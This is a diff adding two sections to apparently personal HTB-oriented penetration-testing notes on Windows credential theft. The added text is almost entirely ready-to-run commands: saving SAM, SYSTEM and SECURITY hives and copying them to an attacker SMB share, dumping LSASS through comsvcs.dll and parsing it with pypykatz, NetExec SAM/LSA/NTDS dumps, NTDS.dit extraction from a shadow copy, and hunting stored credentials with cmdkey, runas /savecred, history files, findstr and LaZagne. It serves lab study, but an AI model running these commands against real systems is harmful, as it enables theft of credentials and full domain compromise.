@@ -427,6 +427,95 @@ Full breakdown: [[Password Attacks (Breakdowns)#memssp: why SSPI-layer intercept
 
 ---
 
+#### Step 6: Offline Credential Dump Alternatives (when Mimikatz is blocked or post-exfil)
+
+**SAM offline dump** (no Mimikatz binary needed — uses built-in reg.exe):
+```cmd
+:: On target (admin cmd):
+reg save HKLM\SAM C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+reg save HKLM\SECURITY C:\Temp\SECURITY
+```
+```bash
+# Exfil via SMB server (Kali):
+sudo impacket-smbserver -smb2support share /home/kali/loot
+# On target: copy C:\Temp\SAM \\KALI_IP\share\SAM  (repeat for SYSTEM/SECURITY)
+
+# Crack offline:
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+```
+
+**LSASS minidump + pypykatz** (when Mimikatz AV-blocked, minidump exfiltrated):
+```powershell
+# On target: dump LSASS to a file (Task Manager → Details → lsass.exe → right-click → Create dump file)
+# OR via comsvcs.dll:
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump <lsass-pid> C:\Temp\lsass.dmp full
+```
+```bash
+# Parse on Kali — no Windows needed:
+pypykatz lsa minidump lsass.dmp
+# Output shows NTLM hashes + any wdigest plaintext
+```
+
+**NetExec remote dump** (one-liner with creds, no shell needed):
+```bash
+nxc smb <target> -u Administrator -p Password123 --sam     # local SAM hashes
+nxc smb <target> -u Administrator -p Password123 --lsa     # LSA secrets
+nxc smb <target> -u Administrator -p Password123 --ntds    # NTDS.dit (DC only)
+```
+
+**NTDS.dit via Volume Shadow Copy** (DC, no NTDS.dit file lock):
+```cmd
+vssadmin CREATE SHADOW /For=C:
+:: Note the shadow path e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+```
+Then exfil + crack: `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`
+
+Full reference: [[Password Attacks (HTB Supplementary)#PA.8 SAM Offline Dump via reg.exe + smbserver|PA.8]], [[Password Attacks (HTB Supplementary)#PA.9 pypykatz lsa minidump|PA.9]], [[Password Attacks (HTB Supplementary)#PA.13 NTDS.dit via Volume Shadow Copy|PA.13]].
+
+#### Tags: #SAM #LSASS #pypykatz #NetExec #NTDS #VSS #OfflineDump #HTBSupplementary
+
+---
+
+#### Step 7: Credential Hunting on Windows
+
+Check common plaintext credential locations before running heavy tools:
+
+```powershell
+# Saved RDP/network credentials
+cmdkey /list
+
+# Use saved credentials without knowing the password
+runas /savecred /user:<domain>\<user> "cmd.exe /c whoami > C:\Temp\out.txt"
+
+# PSReadLine history (current user)
+Get-Content (Get-PSReadlineOption).HistorySavePath
+
+# PowerShell transcript logs
+Get-Content C:\Users\*\Documents\PowerShell_transcript*.txt
+
+# Find credential strings in text files
+findstr /SIM /C:"password" *.txt *.xml *.ini *.config *.bat
+
+# All users' home dirs recursively (broader search)
+Get-ChildItem C:\Users\ -Recurse -ErrorAction SilentlyContinue | Select-String "password" -ErrorAction SilentlyContinue
+```
+
+**LaZagne** (automated multi-app credential extraction):
+```cmd
+:: Extracts credentials from browsers, databases, mail clients, system stores etc.
+.\lazagne.exe all        :: all modules
+.\lazagne.exe browsers   :: browser passwords only
+```
+
+Full reference: [[Password Attacks (HTB Supplementary)#PA.11 Windows Credential Manager (cmdkey + runas /savecred)|PA.11]], [[Password Attacks (HTB Supplementary)#PA.12 LaZagne|PA.12]].
+
+#### Tags: #CredentialHunting #cmdkey #LaZagne #findstr #PSReadLine #HTBSupplementary
+
+---
+
 ### Phase 3: Privilege Escalation
 
 > Full technique details + lab walkthroughs: [[Windows Privilege Escalation]]. Quick command lookup: [[Windows Privilege Escalation (Command Appendix)]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]].
